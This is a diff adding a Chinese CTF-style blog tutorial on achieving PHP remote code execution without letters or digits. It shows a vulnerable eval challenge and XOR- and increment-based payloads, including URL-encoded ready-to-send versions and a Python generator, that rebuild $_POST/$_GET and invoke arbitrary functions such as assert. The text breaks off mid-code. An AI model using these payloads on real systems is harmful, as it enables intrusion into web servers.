@@ -1,0 +1,365 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>无字母RCE | Antel0p3&#39;s blog</title>
+  <meta name="author" content="John Doe">
+  
+  <meta name="description" content="12345678&amp;lt;?phphighlight_file(__FILE__);$code = $_POST[&amp;#x27;code&amp;#x27;];if(preg_match(&amp;quot;/[A-Za-z0-9]+/&amp;quot;,$code))&amp;#123;    die(&amp;quot;hacker!&amp;">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="无字母RCE"/>
+  <meta property="og:site_name" content="Antel0p3&#39;s blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Antel0p3&#39;s blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Antel0p3&#39;s blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+					
+							<div class="page-header">
+								<h1>
+									
+											
+												无字母RCE
+									
+									
+								</h1>
+								
+									<p id="/2023/09/24/rce-noalpha/" class="leancloud-visitors view"
+										data-flag-title="无字母RCE">
+										<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+									</p>
+									
+							</div>
+							
+								
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta">
+		
+	</div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>借助异或构造payload如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$__</span>=(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>); <span class="comment">// _</span></span><br><span class="line"><span class="variable">$__</span>.=(<span class="string">&quot;.&quot;</span>^<span class="string">&quot;~&quot;</span>); <span class="comment">// _P</span></span><br><span class="line"><span class="variable">$__</span>.=(<span class="string">&quot;/&quot;</span>^<span class="string">&quot;`&quot;</span>); <span class="comment">// _PO</span></span><br><span class="line"><span class="variable">$__</span>.=(<span class="string">&quot;|&quot;</span>^<span class="string">&quot;/&quot;</span>); <span class="comment">// _POS</span></span><br><span class="line"><span class="variable">$__</span>.=(<span class="string">&quot;&#123;&quot;</span>^<span class="string">&quot;/&quot;</span>); <span class="comment">// _POST </span></span><br><span class="line"><span class="variable">$$__</span>[_](<span class="variable">$$__</span>[__]); <span class="comment">// $_POST[_]($_POST[__]);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者构造eval($_POST[_]), assert($_POST[_])</span></span><br><span class="line"><span class="comment">// assert($_POST[_])</span></span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span>).(<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span>).(<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);&amp;_=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>
+
+<p>然后我们再取消一下换行符，将它合并于一行之中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$__</span>=(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>);<span class="variable">$__</span>.=(<span class="string">&quot;.&quot;</span>^<span class="string">&quot;~&quot;</span>);<span class="variable">$__</span>.=(<span class="string">&quot;/&quot;</span>^<span class="string">&quot;`&quot;</span>);<span class="variable">$__</span>.=(<span class="string">&quot;|&quot;</span>^<span class="string">&quot;/&quot;</span>);<span class="variable">$__</span>.=(<span class="string">&quot;&#123;&quot;</span>^<span class="string">&quot;/&quot;</span>);<span class="variable">$$__</span>[_](<span class="variable">$$__</span>[__]);	<span class="comment">// $_POST[_]($_POST[__]);</span></span><br></pre></td></tr></table></figure>
+
+<p>最后进行一次URL编码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=%<span class="number">24</span>__%<span class="number">3</span>D(%<span class="number">22</span>%<span class="number">23</span>%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">7</span>C%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">24</span>__.%<span class="number">3</span>D(%<span class="number">22</span>.%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>~%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">24</span>__.%<span class="number">3</span>D(%<span class="number">22</span>%<span class="number">2</span>F%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">60</span>%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">24</span>__.%<span class="number">3</span>D(%<span class="number">22</span>%<span class="number">7</span>C%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">2</span>F%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">24</span>__.%<span class="number">3</span>D(%<span class="number">22</span>%<span class="number">7</span>B%<span class="number">22</span>%<span class="number">5</span>E%<span class="number">22</span>%<span class="number">2</span>F%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">24</span>__%<span class="number">5</span>B_%<span class="number">5</span>D(%<span class="number">24</span>%<span class="number">24</span>__%<span class="number">5</span>B__%<span class="number">5</span>D)%<span class="number">3</span>B</span><br></pre></td></tr></table></figure>
+
+<p>或者直接多个字符一起异或，根据未过滤字符构造目标脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">valid = <span class="string">&quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot;</span>	<span class="comment"># 没有被过滤的字符</span></span><br><span class="line"> </span><br><span class="line">answer = <span class="string">&quot;phpinfo&quot;</span></span><br><span class="line"> </span><br><span class="line">tmp1,tmp2 = <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> answer:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> valid:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> valid:</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j) == <span class="built_in">ord</span>(c)):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;&quot;<span class="subst">&#123;tmp1&#125;</span>&quot;^&quot;<span class="subst">&#123;tmp2&#125;</span>&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &quot;0302181&quot;^&quot;@[@[_^^&quot;</span></span><br><span class="line"><span class="comment"># $_=&quot;0302181&quot;^&quot;@[@[_^^&quot;;$_();</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h3><p>官方文档如下<br><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.operators.increment.php">https://www.php.net/manual/zh/language.operators.increment.php</a></p>
+<blockquote>
+<p>当我们通过某种方法可以得到一个字符时，我们就可以通过自增来获取其他字符，比如现在我们获取到了<code>$_=A</code>，我们进行<code>$_++</code>，此时<code>$_</code>就变成了<code>B</code>，同理就可以构造出<code>GET</code>以及<code>POST</code>字符，接下来以例子来进行讲解,这里例题的话还用之前的demo在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。例如，在 Perl 中 <code>$a = &#39;Z&#39;; $a++;</code> 将把 <code>$a</code> 变成<code>&#39;AA&#39;</code>，而在 C 中，<code>a = &#39;Z&#39;; a++;</code> 将把 <code>a</code> 变成 <code>&#39;[&#39;</code>（<code>&#39;Z&#39;</code> 的 ASCII 值是 90，<code>&#39;[&#39;</code> 的 ASCII 值是 91）。注意字符变量只能递增，不能递减，并且只支持纯 ASCII 字母数字（a-z、A-Z 和 0-9）。递增&#x2F;递减其他字符变量则无效，原字符串没有变化。</p>
+</blockquote>
+<p>我们首先可以写一个<code>[]</code>看一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_</span>);</span><br></pre></td></tr></table></figure>
+
+<p>可以看到它就是一个数组，我们无法获取它的这个<code>Array</code>字符，那我们该怎么获取呢，我们尝试字符拼接</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_</span>);</span><br><span class="line"><span class="comment">// Array</span></span><br></pre></td></tr></table></figure>
+
+<p>成功获取到了字符<code>Array</code>，然后我们获取想获取A的话，就可以采用<code>$_[0]</code>这种方式来获取，但我们是不能够写数字的，所以我们这里可以用一个判断,比如我们在<code>[]</code>里加一个<code>==$</code>，此时因为<code>空</code>和<code>$</code>不同，它就会输出<code>0</code>，此时也就等同于<code>$_[0]</code>，在有些版本中<code>[]</code>中间为非数字字符也会被当做下标0</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;$&#x27;</span>];	<span class="comment">// 或 $_=$_[_];</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;</span><br><span class="line"><span class="comment">// A</span></span><br></pre></td></tr></table></figure>
+
+<p>此时成功获取到了字符<code>A</code>，有了<code>A</code>，我们就可以通过自增依次获取其他字符，我们尝试获取一个字符<code>G</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];<span class="comment">// Array</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;$&#x27;</span>];<span class="comment">// A</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_</span>); <span class="comment">// G</span></span><br></pre></td></tr></table></figure>
+
+<p>然后看我们这里的代码的话，是<code>eval($code)</code>，所以我们就可以构造这种的<code>$_GET[1]($_GET[0])</code>，这个时候我们就可以<code>system(ls)</code>这种命令的执行，所以接下来的话就开始构造</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;<span class="comment">//Array</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;$&#x27;</span>];<span class="comment">//A</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="comment">//E</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;<span class="comment">//E</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//F</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//G</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>;<span class="comment">//G</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="comment">//T</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$___</span>.<span class="variable">$__</span>.<span class="variable">$_</span>;<span class="comment">//GET</span></span><br><span class="line"><span class="comment">//var_dump($_);</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;_&#x27;</span>.<span class="variable">$_</span>;<span class="comment">//_GET</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$$_</span>[_](<span class="variable">$$_</span>[__]));</span><br><span class="line"><span class="comment">//$_GET[_]($_GET[__])</span></span><br><span class="line"><span class="comment">// 或者构造eval($_POST[__]), assert($_POST[__])</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来就可以尝试去给<code>_</code>和<code>__</code>GET传参，这里我们需要把换行的都去掉，然后进行一次URL编码，因为中间件会解码一次，所以我们构造的payload先变成这样</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;$&#x27;</span>];<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>=<span class="variable">$___</span>.<span class="variable">$__</span>.<span class="variable">$_</span>;<span class="variable">$_</span>=<span class="string">&#x27;_&#x27;</span>.<span class="variable">$_</span>;<span class="variable">$$_</span>[_](<span class="variable">$$_</span>[__]);</span><br></pre></td></tr></table></figure>
+
+<p>而后变成</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">5</span>B%<span class="number">5</span>D.<span class="string">&#x27;&#x27;</span>%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">5</span>B<span class="string">&#x27;&#x27;</span>%<span class="number">3</span>D%<span class="number">3</span>D<span class="string">&#x27;%24&#x27;</span>%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>___.%<span class="number">24</span>__.%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D<span class="string">&#x27;_&#x27;</span>.%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">24</span>_%<span class="number">5</span>B_%<span class="number">5</span>D(%<span class="number">24</span>%<span class="number">24</span>_%<span class="number">5</span>B__%<span class="number">5</span>D)%<span class="number">3</span>B</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 附assert($_POST[__])</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>;</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>];</span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>;	<span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;		<span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;	<span class="comment">// ASS</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;	<span class="comment">// ASSE</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;	<span class="comment">// ASSER</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;	<span class="comment">// ASSERT</span></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;	</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;	<span class="comment">// _P</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;	<span class="comment">// _PO</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;	<span class="comment">// _POS</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;	<span class="comment">// _POST</span></span><br><span class="line"><span 